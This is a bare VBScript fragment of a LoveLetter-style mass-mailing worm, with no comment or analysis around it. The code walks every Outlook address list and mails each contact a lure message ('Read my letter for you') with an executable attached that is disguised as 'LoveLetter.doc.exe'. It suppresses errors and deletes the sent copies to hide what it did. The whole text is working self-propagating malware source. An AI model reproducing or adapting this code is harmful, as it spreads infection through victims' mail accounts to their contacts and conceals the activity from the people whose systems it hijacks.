On Error Resume Next
Set out = CreateObject("Outlook.Application")
Set Mapi = out.GetNamespace("MAPI")
For x = 1 To Mapi.AddressLists.Count
    Set book = Mapi.AddressLists.Item(x)
    y = 1
    Set ol = out.CreateItem(0)
    For z = 1 To book.AddressEntries.Count
        Set Mail = book.AddressEntries.Item(y)
        ol.Recipients.Add Mail
        y = y + 1
    Next
    ol.Subject = "Read my letter for you"
    ol.Body = "this was created from the deep inside my heart."
    ol.Attachments.Add "C:\WINDOWS\LoveLetter.doc.exe"
    ol.DeleteAfterSubmit = True
    ol.Send
    mapi = ""
Next
out.Quit

